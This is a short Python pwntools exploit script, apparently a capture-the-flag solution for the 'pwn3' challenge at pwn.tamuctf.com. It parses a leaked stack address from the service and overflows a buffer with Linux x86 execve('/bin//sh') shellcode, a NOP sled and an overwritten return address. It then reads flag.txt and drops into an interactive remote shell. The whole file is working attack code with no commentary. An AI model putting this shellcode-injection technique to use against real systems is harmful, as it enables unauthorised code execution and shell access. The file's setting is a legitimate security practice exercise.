from pwn import *

#p = process("./pwn3")

p = remote("pwn.tamuctf.com", 4323)
k = p.recvline()
print k
#raw_input()
k = k.split(" ")[9]

k=(k[:10])
bufferLocation = p32(int(k,16))

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = ""
payload += shellcode
payload += "\x90"*(298-len(shellcode))

payload += "A"*4
payload += bufferLocation

p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()
